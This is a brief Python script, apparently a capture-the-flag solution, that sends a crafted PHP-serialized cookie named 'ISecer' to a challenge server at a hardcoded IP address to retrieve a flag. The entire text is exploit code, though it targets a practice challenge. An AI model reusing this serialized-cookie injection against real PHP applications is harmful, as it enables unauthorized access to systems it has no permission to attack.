import requests
import phpserialize

target = 'http://120.24.86.145:8002/flagphp/'
session = requests.Session()
session.cookies['ISecer'] = phpserialize.serialize('').decode()

r = session.get(target)
print(r.content.decode())
